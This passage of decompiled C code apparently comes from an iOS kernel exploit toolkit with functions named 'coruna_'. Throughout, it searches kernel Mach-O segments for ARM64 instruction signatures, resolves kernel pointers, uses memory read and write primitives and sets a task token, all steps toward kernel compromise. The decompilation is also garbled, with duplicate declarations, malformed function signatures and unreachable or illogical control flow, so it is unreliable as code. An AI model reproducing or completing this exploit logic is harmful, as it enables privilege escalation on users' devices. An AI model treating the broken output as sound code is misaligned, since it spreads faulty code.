    err = coruna_nop_stub_6(val,host_info,1,&bootargs);
    size = thread_attr;
    if (err == 0) {
      return 0;
    }
    if (1 < bootargs) {
      return 0;
    }
    err = coruna_nop_stub_6(val,thread_attr,1,&scratch);
    if (err == 0) {
      return 0;
    }
    if (1 < scratch) {
      return 0;
    }
    if ((bootargs != size) &&
       (bootargs = err, err = coruna_vm_deallocate_f7f8(val,u,&bootargs,1), err == 0)) {
      return 0;
    }
    if (scratch == size) {
      return 1;
    }
    scratch = err;
    err = coruna_vm_deallocate_f7f8(val,size,&scratch,1);
  }
  if (err == 0) {
    return 0;
  }
  return 1;
}





uint64_t coruna_find_text_exec_37df0(long handle,long *addr_2,long *off_3)
{
  char *ptr;
  int err;
  uint64_t u;
  long handle;
  long addr;
  uint8_t scratch[8];
  long bootargs;
  long thread_attr;
  long host_info;
  
  host_info = 0;
  if ((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) {
    addr = 0;
  }
  else {
    handle = *(long *)(*(long *)(handle + 0x118) + 0x148);
    host_info = handle;
    err = coruna_ctx_test_flag(handle,0x5184001);
    if ((err == 0) && (handle != 0)) {
      *addr_2 = handle;
      return 1;
    }
    addr = *(long *)(*(long *)(handle + 0x118) + 0x140);
    err = coruna_ctx_test_flag(handle,0x5184001);
    if ((err != 0) && (handle != 0 && addr != 0)) {
      *addr_2 = handle;
      *off_3 = addr;
      return 1;
    }
  }
  err = coruna_ctx_test_flag(handle,0x20);
  if (err == 0) {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if (err == 0) {
      coruna_find_ppltext_31f90(scratch,handle);
      if (bootargs == 0) {
        return 0;
      }
      if (thread_attr == 0) {
        return 0;
      }
      if (*(unsigned long *)(handle + 0x158) < 0x225c192d100000) {
        handle = coruna_strsep(scratch,"09 FD 9F 08 C0 03 5F D6",0,1);
        if (handle == 0) {
          return 0;
        }
        host_info = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0xc);
      }
      else {
        handle = coruna_strsep(scratch,"09 01 00 39 C0 03 5F D6",0,1);
        if (handle == 0) {
          return 0;
        }
        handle = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0xc);
        if (handle == 0) {
          return 0;
        }
        host_info = coruna_kernel_remote_trampoline(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle);
      }
      if (host_info == 0) {
        return 0;
      }
      handle = 0;
      *addr_2 = host_info;
    }
    else {
      err = *(int *)(handle + 0x140);
      coruna_find_ppltext_31f90(scratch,handle);
      if (bootargs == 0) {
        return 0;
      }
      if (thread_attr == 0) {
        return 0;
      }
      ptr = "6B 00 00 37 40 00 00 34";
      if (err < 0x225c) {
        ptr = "6A 00 00 37 40 00 00 34";
      }
      addr = coruna_strsep(scratch,ptr,0,1);
      if (addr == 0) {
        return 0;
      }
      handle = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr + -0x10);
      if (handle == 0) {
        return 0;
      }
      host_info = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr + -8);
      if (host_info == 0) {
        return 0;
      }
      *addr_2 = host_info;
      addr = handle;
    }
  }
  else {
    coruna_macho_map_segsect(scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle),"__TEXT_EXEC","__text");
    if (bootargs == 0) {
      return 0;
    }
    if (thread_attr == 0) {
      return 0;
    }
    handle = coruna_strsep(scratch,"08 01 40 39 08 01 00 12",0,1);
    if (handle == 0) {
      return 0;
    }
    handle = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0xc);
    if (handle == 0) {
      return 0;
    }
    u = coruna_kernel6544_residual_256(handle,handle,&host_info);
    if ((int)u == 0) {
      return u;
    }
    *addr_2 = host_info;
    handle = host_info + -1;
  }
  *off_3 = handle;
  handle = *(long *)(handle + 0x118);
  if ((handle != 0) && (*(long *)(handle + 0x120) != 0)) {
    *(long *)(handle + 0x140) = addr;
    *(long *)(handle + 0x148) = host_info;
  }
  return 1;
}





uint64_t coruna_iosurface_prop_mask(long handle,uint64_t val,int *flags)
{
  uint64_t u;
  int err;
  
  err = *(int *)(&k_kernel_slot_1920 + handle);
  if (err + 1U < 2) {
    u = 0;
  }
  else {
    if (0x1c1b19145fffff < *(unsigned long *)(handle + 0x158)) {
      u = coruna_set_task_token(handle);
      if ((int)u == 0) {
        return u;
      }
      err = *(int *)(&k_kernel_slot_1920 + handle);
    }
    *flags = err;
    u = 1;
  }
  return u;
}





uint64_t * coruna_kernel6544_via_kernel6544_via_nop_stub_6(uint64_t val,uint64_t id_2)
{
  uint64_t *ptr;
  void *ptr;
  void *buf;
  uint64_t u;
  size_t ls5;
  
  ptr = _calloc(1,0x18);
  ptr = _calloc(1,0x48);
  coruna_kernel6544_via_nop_stub_6(val,id_2,ptr,0x48,1);
  *ptr = ptr;
  ls5 = *(size_t *)((long)ptr + 0x20);
  buf = _malloc(ls5);
  coruna_kernel6544_via_nop_stub_6(val,*(uint64_t *)((long)ptr + 0x18),buf,ls5,1);
  u = *(uint64_t *)((long)ptr + 0x20);
  ptr[1] = buf;
  ptr[2] = u;
  return ptr;
}





uint32_t coruna_ret_stub_2(uint64_t val,long *handle,long addr_2)
{
  return *(uint32_t *)(handle[1] + (addr_2 - *(long *)(*handle + 0x18)));
}





void coruna_return_zero_3820c_stub(uint64_t *val,uint64_t id_2,uint64_t size_3,uint64_t off_4)
{
  coruna_return_zero_3820c(val,*val,id_2,size_3,off_4);
  return;
}





long coruna_return_zero_3820c(uint64_t val,long *handle,long addr_2,long off_3,uint size)
{
  unsigned long u;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  long handle;
  
  u = handle[1];
  size = u + handle[2] + (unsigned long)size * -4;
  if (size <= u) {
    return 0;
  }
  version = u;
  while (port = u, size != 0) {
    handle = 0;
    while ((*(uint *)(off_3 + handle) & *(uint *)(version + handle)) == *(uint *)(addr_2 + handle)) {
      handle = handle + 4;
      port = version;
      return (port - u) + *(long *)(*handle + 0x18);
    }
    version = version + 4;
    if (size <= version) {
      return 0;
    }
  }
fail:
  return (port - u) + *(long *)(*handle + 0x18);
}





void coruna_return_zero_3820c_stub_2(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_return_zero_3820c(handle,*(uint64_t *)(handle + 8),val,id_2,size_3);
  return;
}





void coruna_kernel6544_via_kernel6544_via_nop_stub_6_3(long handle,char *path)
{
  int err;
  int status;
  unsigned long u;
  uint64_t size;
  long handle;
  char scratch [16];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  handle = **(long **)(handle + 0x10);
  err = coruna_kernel6544_residual_244(*(long **)(handle + 0x10),handle);
  if ((err == -0x1120531) &&
     (err = coruna_kernel6544_residual_244(*(uint64_t *)(handle + 0x10),handle + 0x10), err != 0)) {
    handle = handle + 0x20;
    do {
      status = coruna_kernel6544_residual_244(*(uint64_t *)(handle + 0x10),handle);
      u = coruna_kernel6544_residual_244(*(uint64_t *)(handle + 0x10),handle + 4);
      if (status == 0x19) {
        scratch[0] = '\0';
        scratch[1] = '\0';
        scratch[2] = '\0';
        scratch[3] = '\0';
        scratch[4] = '\0';
        scratch[5] = '\0';
        scratch[6] = '\0';
        scratch[7] = '\0';
        scratch[8] = '\0';
        scratch[9] = '\0';
        scratch[10] = '\0';
        scratch[0xb] = '\0';
        scratch[0xc] = '\0';
        scratch[0xd] = '\0';
        scratch[0xe] = '\0';
        scratch[0xf] = '\0';
        coruna_kernel6544_via_nop_stub_6(*(uint64_t *)(handle + 0x10),handle + 8,scratch,0x10,1);
        status = _strcmp(scratch,path);
        if (status == 0) {
          size = coruna_kernel6544_via_kernel6544_via_nop_stub_6(*(uint64_t *)(handle + 0x10),handle);
          if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
          return;
          }
          ___stack_chk_fail(size);
        }
      }
      handle = handle + (u & 0xffffffff);
      err = err + -1;
    } while (err != 0);
  }
  size = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(size);
}





uint32_t coruna_find_text_exec_383b8(long *handle)
{
  long handle;
  uint32_t u;
  
  handle = coruna_kernel6544_via_kernel6544_via_nop_stub_6_3(handle,"__TEXT_EXEC");
  *handle = handle;
  handle = coruna_kernel6544_via_kernel6544_via_nop_stub_6_3(handle,"__DATA_CONST");
  handle[1] = handle;
  u = 5;
  if (handle != 0 && *handle != 0) {
    u = 0;
  }
  return u;
}





unsigned long coruna_kernel6544_residual_259(long arg,unsigned long val)

{
  uint type_id_13;
  uint type_id_14;
  uint u;
  uint size;
  uint version;
  uint type_id_15;
  unsigned long port;
  uint tag;
  
  type_id_15 = (uint)val;
  type_id_13 = *(uint *)(arg + 0x180);
  port = (unsigned long)type_id_13;
  tag = 0;
  if (type_id_13 != 0) {
    tag = type_id_15 / type_id_13;
  }
  if (type_id_15 == tag * type_id_13) {
    return val;
  }
  tag = type_id_13 << 1;
  if (0x8000 < tag) {
    return port;
  }
  do {
    type_id_14 = 0;
    if (type_id_15 != 0) {
      type_id_14 = tag / type_id_15;
    }
    u = 0;
    if (tag != 0) {
      u = ((tag - type_id_14 * type_id_15) * 100) / tag;
    }
    type_id_14 = 0;
    version = (uint)port;
    if (type_id_15 != 0) {
      type_id_14 = version / type_id_15;
    }
    size = 0;
    if (version != 0) {
      size = ((version - type_id_14 * type_id_15) * 100) / version;
    }
    type_id_14 = tag;
    if (size <= u) {
      type_id_14 = version;
    }
    port = (unsigned long)type_id_14;
    tag = tag + type_id_13;
  } while (tag < 0x8001);
  return port;
}





uint coruna_iosurface_buf_size(long handle)
{
  uint u;
  
  u = *(int *)(handle + 0x180) << 2;
  if (u < 0x4001) {
    u = 0x4000;
  }
  return u >> 1 | 1;
}
uint64_t coruna_kernel6544_via_u64_pack(long handle,uint64_t *val,uint *size)
{
  int err;
  uint64_t u;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  bool err;
  uint64_t type_id;
  int status;
  
  version = k_kernel_rodata_word_0003b838;
  size = k_kernel_rodata_word_3b830;
  u = k_kernel_rodata_word_3b820;
  err = *(int *)(handle + 0x140);
  type_id = 0xffffffff;
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if (err || err == status) {
    if (val != (uint64_t *)0x0) {
      if (*size < 0x1b) {
        return 0xffffffff;
      }
      val[1] = k_kernel_rodata_word_0003b828;
      *val = u;
      val[3] = version;
      val[2] = size;
      port = k_kernel_rodata_word_0003b858;
      type_id = k_kernel_rodata_word_3b850;
      version = k_kernel_rodata_word_0003b848;
      size = k_kernel_rodata_word_3b840;
      u = coruna_u64_pack((k_kernel_rodata_word_0003b880), (k_kernel_rodata_word_3b87c));
      *(uint64_t *)((long)val + 100) = k_kernel_rodata_word_0003b884;
      *(uint64_t *)((long)val + 0x5c) = u;
      kind = k_kernel_rodata_word_3b870;
      tag = k_kernel_rodata_word_3b860;
      u = coruna_u64_pack((k_kernel_rodata_word_3b87c), (k_kernel_rodata_word_0003b878));
      val[9] = k_kernel_rodata_word_0003b868;
      val[8] = tag;
      val[0xb] = u;
      val[10] = kind;
      val[5] = version;
      val[4] = size;
      val[7] = port;
      val[6] = type_id;
    }
    type_id = 0;
    *size = 0x1b;
  }
  return type_id;
}





void coruna_kernel6544_via_kernel6544_via_u64_pack(uint64_t val,uint size)
{
  int err;
  uint u;
  unsigned long size;
  uint *ptr;
  uint scratch;
  uint bootargs [64];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0x40;
  err = coruna_kernel6544_via_u64_pack(val,bootargs,&scratch);
  if ((err == 0) && (size = (unsigned long)scratch, scratch != 0)) {
    ptr = bootargs;
    do {
      u = *ptr;
      if (*(long *)k_kernel_stack_chk_guard_slot != thread_attr) {
      ___stack_chk_fail(u);
      }
      return;
    } while (size != 0);
  }
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != thread_attr) {
    ___stack_chk_fail(u);
  }
  return;
}





unsigned long coruna_kernel6544_residual_260(long arg,unsigned long val,uint n,uint m)

{
  unsigned long type_id_13;
  unsigned long type_id_14;
  long serial_10;
  uint size;
  unsigned long version;
  unsigned long type_id_15;
  long serial_12;
  
  type_id_15 = (unsigned long)*(uint *)(arg + 0x180);
  if (*(uint *)(arg + 0x180) == m) {
    val = val & (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff);
  }
  else {
    size = 0;
    if (n != 0) {
      size = m / n;
    }
    type_id_14 = 0;
    if (0x44a < *(unsigned long *)(arg + 0x158) >> 0x2b) {
      type_id_14 = (unsigned long)(m - size * n);
    }
    type_id_13 = val + n;
    version = 0;
    if (type_id_15 != 0) {
      version = type_id_13 / type_id_15;
    }
    serial_12 = type_id_13 - version * type_id_15;
    serial_10 = 0;
    if (serial_12 != 0) {
      serial_10 = type_id_15 - serial_12;
    }
    do {
      if (type_id_14 == (*(unsigned long *)(arg + 0x188) & val)) {
        return val;
      }
      val = val - n;
    } while ((type_id_13 - m) + serial_10 <= val);
    val = 0;
  }
  return val;
}





long coruna_kernel6544_via_nop_stub_2(long handle,char *path)
{
  int err;
  long handle;
  long addr;
  char *ptr;
  long off;
  long base;
  bool err;
  char *scratch [4];
  long bootargs;
  long thread_attr;
  uint8_t host_info[24];
  char serial_buf [80];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  if (*(int *)(handle + 0x140) - 0x1f53U < 2) {
    off = 0xa8;
    base = 0x289;
  }
  else {
    handle = 0;
    off = 0xa8;
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      off = 0x88;
    }
    base = 0x192;
  }
  handle = *(long *)(&k_kernel_slot_19a0 + handle);
  if (handle == 0) {
    (*(void (*)k_kernel_chkstk_darwin_slot)();
    ptr = "08 29 40 92 09 15 80 52";
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      ptr = "28 69 68 78 09 11 80 52";
    }
    scratch[1] = (char *)0x0;
    err = true;
    handle = 1;
    scratch[0] = ptr;
    do {
      if (ptr != (char *)0x0) {
        coruna_macho_text_sect(host_info,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
        addr = coruna_strsep(host_info,ptr,0,0);
        if (addr != 0) {
          handle = coruna_ioservicegetmatchingservice_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr + 8);
          if (handle != 0) {
            *(long *)(&k_kernel_slot_19a0 + handle) = handle;
            break;
          }
          handle = 0;
        }
      }
      handle = 0;
      err = false;
      ptr = scratch[handle];
      handle = 2;
    } while( true );
  }
  base = base + -1;
  do {
    handle = off + handle;
    scratch[3] = *(char **)(&k_kernel_slot_19f8 + handle);
    bootargs = handle;
    thread_attr = off;
    addr = coruna_kernel6544_residual_247(scratch + 3,1);
    if (addr == 0) break;
    coruna_nop_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr,off,0);
    if (*(long *)(addr + 0x10) != 0) {
      scratch[3] = *(char **)(&k_kernel_slot_19f8 + handle);
      thread_attr = 0x50;
      bootargs = *(long *)(addr + 0x10);
      ptr = (char *)coruna_kernel6544_residual_247(scratch + 3,0);
      if (ptr == (char *)0x0) {
        ptr = serial_buf;
        serial_buf[0] = '\0';
        coruna_nop_stub_6(handle,*(uint64_t *)(addr + 0x10),0x50,serial_buf);
      }
      else {
        coruna_nop_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),ptr,0x50,0);
      }
      err = _strcmp(path,ptr);
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return handle;
      }
      ___stack_chk_fail();
    }
    base = base + -1;
  } while (base != 0);
fail:
  handle = 0;
done:
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return handle;
  }
  ___stack_chk_fail();
}





uint32_t coruna_macho_data_seg_38898(long handle,long addr_2)
{
  unsigned long u;
  int err;
  int status;
  long handle;
  uint64_t size;
  uint64_t scratch;
  unsigned long bootargs;
  long thread_attr;
  uint64_t host_info;
  long serial_buf;
  
  host_info = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
    return 0xad008;
  }
  err = *(int *)(handle + 0x140);
  if ((1 < err - 0x1f53U && err != 0x2258) && err != 0x1c1b) {
    return 0x2802c;
  }
  err = coruna_kernel6544_residual_256(handle,addr_2 + 0x28,&serial_buf);
  if (err != 0) {
    if (serial_buf != 0) {
      handle = coruna_ptr_canonicalize(handle);
      if (handle != 0) {
        return 0;
      }
      return 0x28026;
    }
    coruna_macho_map_segsect(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle),"__DATA","__data");
    if ((bootargs != 0) && (thread_attr != 0)) {
      u = bootargs;
      do {
        if ((bootargs + thread_attr) - 0x100 <= u) {
          return 0xad011;
        }
        size = coruna_kernel_remote_trampoline(scratch,u);
        size = coruna_kernel6544_via_ctx_test_flag_5(handle,size);
        handle = coruna_kernel6544_residual_246(handle,size);
        if (((handle != 0) && (handle = coruna_kernel_remote_trampoline(scratch,u + 8), handle == 0)) &&
           (handle = coruna_kernel_remote_trampoline(scratch,u + 0x10), handle == 10)) {
          handle = coruna_kernel_remote_trampoline(scratch,u + 0x18);
          if (handle != 0) {
            size = coruna_kernel_remote_trampoline(scratch,u + 0x20);
            size = coruna_kernel6544_via_ctx_test_flag_5(handle,size);
            handle = coruna_kernel6544_residual_246(handle,size);
            if (handle != 0) {
              if (u == 0) {
                return 0xad011;
              }
              err = coruna_mach_vm_machine_attribute(handle,addr_2 + 0x88,0x10000);
              if (err != 0) {
                err = coruna_nop_stub_7(handle,u + 0x18,&host_info,8);
                if (err == 0) {
                  return 0x28010;
                }
                err = 0x14;
                while( true ) {
                  coruna_semaphore_timedwait(handle,&k_kernel_rodata_word_3d090);
                  status = coruna_kernel6544_residual_256(handle,addr_2 + 0x28,&serial_buf);
                  if (status == 0) {
                    return 0x2800f;
                  }
                  if (serial_buf != 0) break;
                  err = err + -1;
                  if (err == 0) {
                    return 0xad00b;
                  }
                }
                return 0;
              }
              return 0x28010;
            }
          }
        }
        u = u + (long)*(int *)(handle + 0x168);
      } while( true );
    }
  }
  return 0x2800f;
}





uint64_t
void coruna_kernel6544_via_nop_stub_8(long handle,long addr_2,unsigned long arg,unsigned long arg,void (*p,uint64_t val)
{
  uint u;
  int err;
  int status;
  long handle;
  uint64_t size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  uint64_t type_id;
  uint type_id_8;
  uint scratch;
  unsigned long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint32_t serial_buf;
  int action;
  uint64_t block_ctx;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t sa_saved;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t path_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t tmp_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t region;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t plist;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  long url_buf;
  
  url_buf = *(long *)k_kernel_stack_chk_guard_slot;
  action = -1;
  host_info = 0;
  cache_22 = 0;
  plist = 0;
  cache_24 = 0;
  cache_23 = 0;
  type_id_8 = 0x145fffff;
  type_id = 0x2800f;
  cache = 0;
  region = 0;
  cache_21 = 0;
  cache_20 = 0;
  json_buf = 0;
  tmp_buf = 0;
  work = 0;
  frame = 0;
  region = 0;
  path_buf = 0;
  url_buf = 0;
  plist = 0;
  sa_new = 0;
  sa_new = 0;
  tmp_buf = 0;
  path_buf = 0;
  block_ctx = 0;
  sa_saved = 0;
  sa_saved = 0;
  stack_guard = 0;
  host_info = 0;
  stack_guard = 0;
  action = 0;
  serial_buf = 0;
  scratch = 0;
  block_ctx = 0;
  thread_attr = 0;
  bootargs = 0;
  handle = 0x28;
  if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
    handle = 0x20;
  }
  err = coruna_kernel6544_residual_256(handle,handle + addr_2,&thread_attr);
  if (err == 0) {
    size = 0x2800f;
    if (action != -1) {
    coruna_close();
    }
    if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
    return size;
    }
    ___stack_chk_fail();
  }
  handle = coruna_ptr_canonicalize(handle,thread_attr);
  if (handle != 0) {
    if (0xff < (int)arg - 1U) {
      size = 0x28011;
      if (action != -1) {
      coruna_close();
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
      return size;
      }
      ___stack_chk_fail();
    }
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      bootargs = arg | 1;
done:
      size = coruna_open_dev_null(&action);
      if ((int)size == 0) {
        err = coruna_nop_stub_9(handle,arg,&block_ctx,arg);
        if (err == 0) {
cleanup:
          size = 0x28010;
        }
        else {
          err = coruna_kernel6544_residual_250();
          size = type_id;
          if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
            err = coruna_nop_stub_8(handle,thread_attr +
                                         (unsigned long)(uint)(*(int *)(handle + 0x180) * err),
                                 (long)*(int *)(handle + 0x168),&host_info);
            if (action != -1) {
            coruna_close();
            }
            if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
            return size;
            }
            ___stack_chk_fail();
          }
          else {
            err = coruna_nop_stub_8(handle,thread_attr +
                                         (unsigned long)(uint)(*(int *)(handle + 0x180) * err) + 8,
                                 (long)*(int *)(handle + 0x168),&host_info);
            if (action != -1) {
            coruna_close();
            }
            if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
            return size;
            }
            ___stack_chk_fail();
          }
          size = 0x28026;
        }
      }
      if (action != -1) {
      coruna_close();
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
      return size;
      }
      ___stack_chk_fail();
    }
    err = 0;
    version = arg & 0xffffffff;
    bootargs = arg + version * -0x400;
    port = arg;
    tag = arg;
    kind = arg;
    do {
      if ((*(unsigned long *)(handle + 0x188) & kind) == 0) {
        bootargs = tag;
        if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
          bootargs = port | 1;
        }
        {
          size = coruna_open_dev_null(&action);
          if ((int)size == 0) {
          err = coruna_nop_stub_9(handle,arg,&block_ctx,arg);
          if (err == 0) {
          cleanup:
          size = 0x28010;
          }
          else {
          err = coruna_kernel6544_residual_250();
          size = type_id;
          if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
          err = coruna_nop_stub_8(handle,thread_attr +
          (unsigned long)(uint)(*(int *)(handle + 0x180) * err),
          (long)*(int *)(handle + 0x168),&host_info);
          if (action != -1) {
          coruna_close();
          }
          if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
          return size;
          }
          ___stack_chk_fail();
          }
          else {
          err = coruna_nop_stub_8(handle,thread_attr +
          (unsigned long)(uint)(*(int *)(handle + 0x180) * err) + 8,
          (long)*(int *)(handle + 0x168),&host_info);
          if (action != -1) {
          coruna_close();
          }
          if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
          return size;
          }
          ___stack_chk_fail();
          }
          size = 0x28026;
          }
          }
          if (action != -1) {
          coruna_close();
          }
          if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
          return size;
          }
          ___stack_chk_fail();
        }
      }
      kind = kind - version;
      tag = tag + (1 - version);
      port = port + (4 - version);
      err = err + 1;
    } while (err != 0x400);
  }
  size = 0x28026;
fail:
  if (action != -1) {
    coruna_close();
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == url_buf) {
    return size;
  }
  ___stack_chk_fail();
}





uint64_t
void coruna_kernel6544_via_nop_stub_8_2(long handle,long addr_2,unsigned long arg,unsigned long *arg,void (*p,uint64_t val
            )
{
  uint u;
  uint size;
  uint version;
  int err;
  int status;
  long handle;
  uint64_t port;
  uint64_t tag;
  uint scratch;
  unsigned long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint32_t scratch;
  int serial_buf;
  
  tag = 0x2800f;
  serial_buf = -1;
  host_info = 0;
  handle = 0x28;
  if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
    handle = 0x20;
  }
  err = coruna_kernel6544_residual_256(handle,handle + addr_2,&thread_attr);
  if (err == 0) {
    port = 0x2800f;
  }
  else {
    handle = coruna_ptr_canonicalize(handle,thread_attr);
    if (handle == 0) {
      port = 0x28026;
    }
    else {
      port = coruna_open_dev_null(&serial_buf);
      if ((int)port == 0) {
        err = coruna_kernel6544_residual_250();
        if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
          port = 0xad008;
        }
        else {
          err = coruna_nop_stub_8(handle,thread_attr + (unsigned long)(uint)(*(int *)(handle + 0x180) * err) +
                                       8,(long)*(int *)(handle + 0x168),&host_info);
          port = tag;
          if (err != 0) {
            handle = coruna_ptr_canonicalize(handle,host_info);
            if (handle == 0) {
              port = 0x28026;
            }
            else {
              err = coruna_kernel6544_residual_250();
              status = coruna_nop_stub_8(handle,thread_attr +
                                           (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                                   &scratch);
              if (status != 0) {
                do {
                  version = scratch;
                  u = scratch & 0xffff;
                  size = u;
                  if (u == 0) {
                    if (0xffff < scratch) {
                      size = scratch >> 0x10;
                      if (7 < (uint)((unsigned long)size - 1)) {
                      port = 0x28011;
                      break;
                      }
                      handle = 0x10;
                      if (u != 0) {
                      handle = 8;
                      }
                      status = coruna_nop_stub_8(handle,thread_attr + handle +
                      (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                      &scratch);
                      port = tag;
                      if (status == 0) break;
                    }
                    if ((arg != (void (*)0x0) &&
                       (port = (*arg)(handle,val), (int)port != 0)) break;
                  }
                  else {
fail:
                    if (7 < (uint)((unsigned long)size - 1)) {
                      port = 0x28011;
                      break;
                    }
                    handle = 0x10;
                    if (u != 0) {
                      handle = 8;
                    }
                    status = coruna_nop_stub_8(handle,thread_attr + handle +
                                                 (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                                         &scratch);
                    port = tag;
                    if (status == 0) break;
                    host_info = coruna_u64_pack((host_info), (scratch));
                    bootargs = 0;
                    status = coruna_nop_stub_8(handle,host_info +
                                                 (long)*(int *)(handle + 0x168) *
                                                 ((unsigned long)size - 1),(long)*(int *)(handle + 0x168),
                                         &bootargs);
                    if (status == 0) break;
                    handle = coruna_ptr_canonicalize(handle,bootargs &
                                                 (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff))
                    ;
                    if (handle != 0) {
                      bootargs = (bootargs & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)) +
                                 (*(unsigned long *)(handle + 0x188) & bootargs) * (arg & 0xffffffff);
                      scratch = (version & 0xffff0000) - 0x10000;
                      if (u != 0) {
                        scratch = version & 0xffff0000;
                        version = version - 1;
                      }
                      scratch = scratch | version & 0xffff;
                      status = coruna_kernel6544_residual_250();
                      if (status == err) {
                        err = coruna_nop_stub_9(handle,thread_attr +
                                                     (unsigned long)(uint)(*(int *)(handle + 0x180) * err
                                                                  ),&scratch,4);
                        if (err == 0) {
                          port = 0x28010;
                        }
                        else {
                          *arg = bootargs;
                          port = 0;
                        }
                        break;
                      }
                    }
                  }
                  err = coruna_kernel6544_residual_250();
                  status = coruna_nop_stub_8(handle,thread_attr +
                                               (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                                       &scratch);
                  port = tag;
                } while (status != 0);
              }
            }
          }
        }
      }
    }
  }
  if (serial_buf != -1) {
    coruna_close();
  }
  return port;
}





int coruna_mac_syscall(void)
{
  int err;
  
  err = _syscall(0x17d);
  return err;
}





int coruna_getattrlistbulk(void)
{
  int err;
  
  err = _syscall(0x1cd);
  return err;
}





int coruna_getattrlistbulk_39278(void)
{
  int err;
  
  err = _syscall(0x206);
  return err;
}





unsigned long coruna_cpu_capabilities_base(void)

{
  return *(unsigned long *)(k_kernel_get_cpu_capabilities_slot + 0xc) & 0xffffffffffffff00;
}

